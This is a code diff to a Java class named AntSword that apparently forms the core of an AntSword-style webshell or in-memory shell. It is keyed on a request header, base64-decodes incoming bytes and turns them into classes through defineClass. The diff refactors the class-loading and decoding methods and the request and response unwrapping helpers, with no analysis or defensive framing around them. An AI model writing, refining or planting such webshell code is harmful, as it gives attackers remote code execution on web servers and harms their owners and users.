@@ -11,11 +11,6 @@ public class AntSword extends ClassLoader {
     public static String headerName;
     public static String headerValue;
 
-    @SuppressWarnings("all")
-    public Class<?> g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
-    }
-
     public AntSword() {
     }
 
@@ -44,24 +39,28 @@ public class AntSword extends ClassLoader {
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public Class<?> g(byte[] b) {
+        return defineClass(b, 0, b.length);
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
+        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
         try {
-            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
+            base64 = contextClassLoader.loadClass("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = contextClassLoader.loadClass("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
 
+    @SuppressWarnings("all")
     public Object unwrapRequest(Object request) {
         Object internalRequest = request;
         while (true) {
@@ -78,6 +77,7 @@ public class AntSword extends ClassLoader {
         }
     }
 
+    @SuppressWarnings("all")
     public Object unwrapResponse(Object response) {
         Object internalResponse = response;
         while (true) {
